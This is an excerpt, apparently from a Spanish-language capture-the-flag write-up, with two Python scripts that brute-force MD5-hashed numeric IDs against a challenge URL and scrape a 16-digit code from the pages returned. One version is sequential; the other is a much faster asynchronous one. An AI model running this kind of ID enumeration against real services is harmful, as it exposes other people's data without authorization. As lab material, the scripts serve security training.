...
Script sin dependencias externas (solo librerías estándar de Python). Para un rango de 1000 números tarda ~2:16 minutos.

```python
#!/usr/bin/env python3
# chat.py - prueba hashes MD5 de números en un rango contra un endpoint
# y busca un código de 16 dígitos. Solo usa librerías estándar.
...
DEFAULT_URL_BASE = "https://chl-4291e720-871d-4e90-a43e-c438012db0f1-apagar-ia.softwareseguro.com.ar/codes/{}"
...
def parse_args():
    parser = argparse.ArgumentParser(description="Probar MD5s de números en rango y buscar código de 16 dígitos en la página resultante.")
    parser.add_argument("start", nargs="?", type=int, default=None)
    parser.add_argument("end", nargs="?", type=int, default=None)
    parser.add_argument("--zero-pad", type=int, dest="zero_pad", default=None)
    parser.add_argument("--url", dest="url_base", default=DEFAULT_URL_BASE)
...
def main():
    ...
    if "{}" not in url_base:
        print("[ERROR] La URL debe contener '{}' exactamente donde insertar el MD5.")
        print("Ejemplo válido: https://mihost/endpoint/{}")
        sys.exit(1)

    ensure_outdir()

    print(f"[+] Probando rango {start}..{end}" + (f" con zero-pad={args.zero_pad}" if args.zero_pad else ""))
    if args.verbose:
        print(f"[+] URL base: {url_base}")

    for n in range(start, end + 1):
        candidate = str(n)
        candidate_to_hash = candidate.zfill(args.zero_pad) if args.zero_pad else candidate
        ...
        try:
            ...
            if args.verbose:
                print(f"[-] HTTP {e.code} para MD5 {md5hash} (candidate {candidate_to_hash})")
            continue
        ...
        if code16:
            ...
            print(f"    Candidate (lo que hasheamos): '{candidate_to_hash}'")
            print(f"    MD5 usado en URL: {md5hash}")
            print(f"    Página guardada en: {filepath}")
            with open(os.path.join(OUTPUT_DIR, "result_summary.txt"), "w", encoding="utf-8") as s:
                s.write(f"code16={code16}\ncandidate={candidate_to_hash}\nmd5={md5hash}\npage={filepath}\n")
            return

        if args.verbose:
            print(f"[ ] No encontrado en MD5 {md5hash} (candidate {candidate_to_hash})")
...
Script asíncrono con `aiohttp` — para el mismo rango de 1000 números tarda ~4,38 segundos.
...
url_base = "https://chl-15ad21f5-67fb-4a65-a895-427c6c46105a-apagar-ia.softwareseguro.com.ar/codes/"
                ...
                if response.status == 200:
                    ...
                    for li in li_tags:
                        ...
                        if texto.isdigit() and len(texto) == 16:
                            print(f"Numero iteracion: {i} -- Numero 16 dígitos: {texto} -- URL: {url_enviar}")
        except:
            pass
        finally:
            pbar.update(1)
...
async def main():
    ...
    async with aiohttp.ClientSession() as session:
        ...
        with tqdm(total=total, desc="Procesando") as pbar:
            tasks = [probar(session, i, sema, pbar) for i in range(nro_inicial, nro_final + 1)]
